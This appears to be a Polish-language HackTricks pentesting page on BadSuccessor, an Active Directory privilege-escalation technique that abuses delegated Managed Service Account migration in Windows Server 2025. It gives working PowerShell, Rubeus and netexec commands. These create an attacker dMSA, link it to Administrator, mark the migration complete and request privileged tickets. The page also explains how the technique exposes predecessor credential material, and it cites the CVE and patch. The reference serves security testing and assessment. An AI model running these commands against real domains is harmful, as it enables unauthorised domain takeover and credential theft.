# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Overview

**BadSuccessor** wykorzystuje workflow migracji **delegated Managed Service Account** (**dMSA**) wprowadzony w **Windows Server 2025**. dMSA można połączyć ze starszym kontem za pomocą **`msDS-ManagedAccountPrecededByLink`** i przeprowadzić przez stany migracji przechowywane w **`msDS-DelegatedMSAState`**. Jeśli attacker może utworzyć dMSA w zapisywalnym OU i kontrolować te atrybuty, KDC może wystawiać tickety dla kontrolowanego przez attackera dMSA z **kontekstem autoryzacji powiązanego konta**.<sup>[[2]](#references)</sup>

W praktyce oznacza to, że użytkownik o niskich uprawnieniach, który ma jedynie delegowane prawa do OU, może utworzyć nowe dMSA, wskazać je na `Administrator`, zakończyć stan migracji, a następnie uzyskać TGT, którego PAC zawiera uprzywilejowane grupy, takie jak **Domain Admins**.<sup>[[2]](#references)</sup>

## dMSA migration details that matter

- dMSA jest funkcją **Windows Server 2025**.
- `Start-ADServiceAccountMigration` ustawia migrację w stanie **started**.
- `Complete-ADServiceAccountMigration` ustawia migrację w stanie **completed**.
- `msDS-DelegatedMSAState = 1` oznacza rozpoczęcie migracji.
- `msDS-DelegatedMSAState = 2` oznacza zakończenie migracji.
- Podczas poprawnej migracji dMSA ma w sposób transparentny zastąpić zastępowane konto, dlatego KDC/LSA zachowują dostęp, który poprzednie konto już posiadało.<sup>[[3]](#references)</sup>

Microsoft Learn wskazuje również, że podczas migracji oryginalne konto zostaje powiązane z dMSA, a dMSA ma uzyskiwać dostęp do tych samych zasobów, do których dostęp miało stare konto.<sup>[[3]](#references)</sup> To właśnie założenie bezpieczeństwa wykorzystuje BadSuccessor.<sup>[[2]](#references)</sup>

## Requirements

1. Domena, w której **dMSA istnieje**, co oznacza, że po stronie AD dostępna jest obsługa **Windows Server 2025**.
2. Attacker może **utworzyć** obiekty `msDS-DelegatedManagedServiceAccount` w wybranym OU lub ma równoważne, szerokie uprawnienia do tworzenia obiektów podrzędnych.
3. Attacker może **zapisywać** odpowiednie atrybuty dMSA lub w pełni kontroluje właśnie utworzone dMSA.
4. Attacker może żądać ticketów Kerberos z kontekstu przyłączonego do domeny lub przez tunnel, który ma dostęp do LDAP/Kerberos.<sup>[[2]](#references)</sup>

### Practical checks

Najbardziej jednoznacznym sygnałem dla operatora jest sprawdzenie poziomu domeny/lasu i potwierdzenie, że środowisko korzysta już z nowego stacka Server 2025:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Jeśli widzisz wartości takie jak `Windows2025Domain` i `Windows2025Forest`, potraktuj **BadSuccessor / dMSA migration abuse** jako priorytetowy test.

Możesz również enumerować zapisywalne jednostki OU delegowane do tworzenia dMSA za pomocą publicznie dostępnych narzędzi:<sup>[[1]](#references)</sup>
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Przebieg nadużycia

1. Utwórz dMSA w OU, w którym masz delegowane uprawnienia do tworzenia obiektów podrzędnych.
2. Ustaw **`msDS-ManagedAccountPrecededByLink`** na DN uprzywilejowanego celu, takiego jak `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Ustaw **`msDS-DelegatedMSAState`** na `2`, aby oznaczyć migrację jako ukończoną.
4. Zażądaj TGT dla nowego dMSA i użyj otrzymanego biletu, aby uzyskać dostęp do uprzywilejowanych usług.<sup>[[2]](#references)</sup>

Przykład PowerShell:<sup>[[2]](#references)</sup>
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Przykłady zgłoszeń ticketów / narzędzi operacyjnych:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Dlaczego to coś więcej niż privilege escalation

Podczas legalnej migracji Windows musi również umożliwić nowemu dMSA obsługę ticketów wystawionych dla poprzedniego konta przed przełączeniem. Dlatego materiały ticketów związane z dMSA mogą zawierać klucze **current** i **previous** w ramach przepływu **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>

W przypadku fałszywej migracji kontrolowanej przez atakującego takie zachowanie może zmienić BadSuccessor w:<sup>[[2]](#references)</sup>

- **Privilege escalation** poprzez dziedziczenie uprzywilejowanych SID-ów grup w PAC.
- **Ujawnienie materiału poświadczeń**, ponieważ obsługa previous-key może w podatnych przepływach ujawnić materiał równoważny RC4/NT hash poprzednika.

Dzięki temu technika jest przydatna zarówno do bezpośredniego przejęcia domeny, jak i do dalszych działań, takich jak pass-the-hash lub szersze przejęcie poświadczeń.

## Uwagi dotyczące statusu poprawek

Pierwotne zachowanie BadSuccessor **nie jest wyłącznie teoretycznym problemem z wersji preview z 2025 roku**. Microsoft przypisał mu identyfikator **CVE-2025-53779** i opublikował security update w **sierpniu 2025 roku**.<sup>[[4]](#references)</sup> Zachowaj ten atak w dokumentacji na potrzeby:

- **laboratoriów / CTF-ów / ćwiczeń assume-breach**
- **niezałatanych środowisk Windows Server 2025**
- **weryfikacji delegacji OU i ekspozycji dMSA podczas assessmentów**

Nie zakładaj, że domena Windows Server 2025 jest podatna tylko dlatego, że istnieje dMSA; sprawdź poziom poprawek i przeprowadzaj testy ostrożnie.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - BadSuccessor dMSA abuse to Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
